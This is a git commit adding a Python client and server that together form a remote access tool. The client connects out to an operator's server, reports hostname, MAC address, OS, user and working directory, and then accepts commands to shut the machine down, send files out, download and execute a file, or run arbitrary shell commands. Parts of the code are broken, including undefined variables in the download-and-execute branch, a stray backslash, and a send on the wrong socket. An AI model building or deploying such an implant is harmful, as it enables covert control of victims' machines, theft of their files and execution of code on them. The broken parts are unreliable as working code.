570175e856fec684520fb0b071a303a1928fcb11
Matt <matthew.bradley0529@gmail.com>
2020-06-15 00:58:33 -0400

    Initial commit, pushing client and server to repo

---
+++ client.py
@@ -0,0 +1,112 @@
+#
+# client.py
+# Matthew Bradley
+#
+# Requires python3 module psutil to run.
+#
+import os
+import sys
+import socket
+import psutil
+import platform
+import subprocess
+import tqdm
+import getpass
+from uuid import getnode
+from shlex import split
+
+BUFF_SIZE = 1024
+
+server = sys.argv[1]
+port = sys.argv[2]
+hostname = socket.gethostname()
+uname = platform.uname()  # Used for getting system info
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.connect((server, int(port)))
+
+    print("Connection established to remote server: " + server + ":" + port)
+    s.send(hostname.encode())
+    mac = hex(getnode())
+    s.send(mac.encode())
+    family = platform.system()
+    release = platform.release()
+    opsys = family + ' ' + release
+    s.send(opsys.encode())
+    process = psutil.Process(os.getpid())
+    processName = process.name()
+    s.send(processName.encode())
+    pid = os.getpid()
+    s.send(str(pid).encode())
+    user = getpass.getuser()
+    s.send(user.encode())
+    cwd = os.getcwd()
+    s.send(cwd.encode())
+
+    while True:
+        cmd = s.recv(BUFF_SIZE).decode()
+
+        if int(cmd) == 1:  # Shutdown command
+            if (family == "Windows"):  # Windows device
+                os.system("shutdown /s /t 1")
+            else:
+                os.system("shutdown now -h")
+
+        elif int(cmd) == 2:  # kill client
+            sys.exit()
+
+        elif int(cmd) == 3:  # Return MAC
+            mac = hex(getnode())
+            s.send(mac.encode())
+            process = psutil.Process(os.getpid())
+            processName = process.name()
+            s.send(processName.encode())
+            pid = os.getpid()
+            s.send(str(pid).encode())
+            user = getpass.getuser()
+            s.send(user.encode())
+            cwd = os.getcwd()
+            s.send(cwd.encode())
+
+        elif int(cmd) == 4:  # upload file to server
+            filepath = s.recv(BUFF_SIZE).decode()
+            size = os.path.getsize(filepath)
+            s.send(str(size).encode())
+
+\            progBar = tqdm.tqdm(range(size), f"Sending file: {filepath} to server", unit="B", unit_scale=True,
+                                unit_divisor=1024)
+            with open(filepath, "rb") as f:
+                for _ in progBar:
+                    readBytes = f.read(BUFF_SIZE)
+                    if not readBytes:  # done
+                        break
+                    s.send(readBytes)
+                    progBar.update(len(readBytes))
+            print("File sent.")
+
+        elif int(cmd) == 5:  # download and execute
+            filepath = s.recv(BUFF_SIZE).decode()
+            size = os.path.getsize(filepath)
+            s.send(str(size).encode())
+
+            progBar = tqdm.tqdm(range(int(filesize)), f"Retrieving file: {filename} from server", unit="B",
+                                unit_scale=True, unit_divisor=1024)
+            with open(filename, "wb") as f:
+                for _ in progBar:
+                    readBytes = handler.recv(BUFF_SIZE)
+                    if not readBytes:  # done
+                        break
+                    f.write(readBytes)
+                    progBar.update(len(readBytes))
+            print("File recieved from server....executing")
+
+            os.system(filepath)
+
+        elif int(cmd) == 6:  # run sys command, fails with a DIR command but works with ipconfig????
+            command = s.recv(BUFF_SIZE).decode()
+            command = command.split()
+            proc = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                    shell=True)  # Redirects stderr to stdout
+            results = proc.communicate()[0]
+            s.send(
+                results)  # results contains a bytes object with the output/stderr of the command run by subprocess.run
---
+++ server.py
@@ -0,0 +1,124 @@
+import os
+import sys
+import socket
+import tqdm
+
+BUFF_SIZE = 1024
+choice = 1
+ip = sys.argv[1]
+port = sys.argv[2]
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    print("Starting server on IP: " + ip + " Port: " + port)
+    s.bind((ip, int(port)))
+    s.listen()
+
+    handler, addr = s.accept()
+
+    print("Connection received from remote IP: " + addr[0])
+
+    hostname = handler.recv(BUFF_SIZE).decode()
+    mac = handler.recv(BUFF_SIZE).decode()
+    opsys = handler.recv(BUFF_SIZE).decode()
+    process = handler.recv(BUFF_SIZE).decode()
+    pid = handler.recv(BUFF_SIZE).decode()
+    user = handler.recv(BUFF_SIZE).decode()
+    cwd = handler.recv(BUFF_SIZE).decode()
+
+    print("Remote machine Hostname: " + hostname)
+    print("Remote machine IP: " + addr[0])
+    print("Remote machine MAC address: " + mac)
+    print("Remote machine OS: " + opsys)
+    print("Running as Process: " + process)
+    print("With PID: " + pid)
+    print("Under user: " + user)
+    print("In CWD: " + cwd)
+
+    while choice != 0:
+        print("*" * 40)
+        print("Select command to execute on remote machine:")
+        print("\'1\' to shutdown remote machine.")
+        print("\'2\' to kill remote agent.")
+        print("\'3\' to retrieve host information (Hostname/IP/PID/OS/etc.).")
+        print("\'4\' to download file from remote machine.")
+        print("\'5\' to upload and execute file on remote machine.")
+        print("\'6\' to run a command on the remote machine.")
+        print("\'0\' to quit.")
+        choice = int(input("Command: "))
+
+        if choice == 1:
+            print("Shutting down remote machine.")
+            handler.send('1'.encode())
+
+        elif choice == 2:
+            print("Killing remote agent.")
+            handler.send('2'.encode())
+
+        elif choice == 3:
+            handler.send('3'.encode())
+            mac = handler.recv(BUFF_SIZE).decode()
+            process = handler.recv(BUFF_SIZE).decode()
+            pid = handler.recv(BUFF_SIZE).decode()
+            user = handler.recv(BUFF_SIZE).decode()
+            cwd = handler.recv(BUFF_SIZE).decode()
+            print("Remote machine Hostname: " + hostname)
+            print("Remote machine IP: " + addr[0])
+            print("Remote machine MAC address: " + mac)
+            print("Remote machine OS: " + opsys)
+            print("Running as Process: " + process)
+            print("With PID: " + pid)
+            print("Under user: " + user)
+            print("In CWD: " + cwd)
+
+
+        elif choice == 4:
+            handler.send('4'.encode())
+            filepath = input("Enter remote filepath: ")
+            handler.send(filepath.encode())
+            filename = os.path.basename(filepath)
+            filesize = handler.recv(BUFF_SIZE).decode()
+            print("Remote filesize: " + filesize + " Bytes.")
+            print("Saving remote file as: " + filename)
+            progBar = tqdm.tqdm(range(int(filesize)), f"Retrieving file: {filename} from remote machine", unit="B",
+                                unit_scale=True, unit_divisor=1024)
+            with open(filename, "wb") as f:
+                for _ in progBar:
+                    readBytes = handler.recv(BUFF_SIZE)
+                    if not readBytes:  # done
+                        break
+                    f.write(readBytes)
+                    progBar.update(len(readBytes))
+            print("File retrieved.")
+
+        elif choice == 5:  # upload and execute file on client
+            handler.send('5'.encode())
+            filepath = input("Enter local filepath to upload: ")
+            trgtpath = input("Enter filepath to save file as on target: ")
+            handler.send(trgtpath.encode())
+            size = os.path.getsize(filepath)
+            s.send(str(size).encode())
+
+            progBar = tqdm.tqdm(range(size), f"Sending file: {filepath} to remote machine", unit="B", unit_scale=True,
+                                unit_divisor=1024)
+            with open(filepath, "rb") as f:
+                for _ in progBar:
+                    readBytes = f.read(BUFF_SIZE)
+                    if not readBytes:  # done
+                        break
+                    s.send(readBytes)
+                    progBar.update(len(readBytes))
+            print("File sent to client for execution.")
+
+        elif choice == 6:  # run system command on target, echoes command back before printing results
+            handler.send('6'.encode())
+            cmd = input("Command to run on target: ")
+            handler.send(cmd.encode())
+
+            results = handler.recv(BUFF_SIZE).decode()
+            print(cmd + '\n' + results)
+
+        elif choice == 0:
+            print("Exiting. Have a nice day.")
+            sys.exit()
+        else:
+            print("Invalid command.")
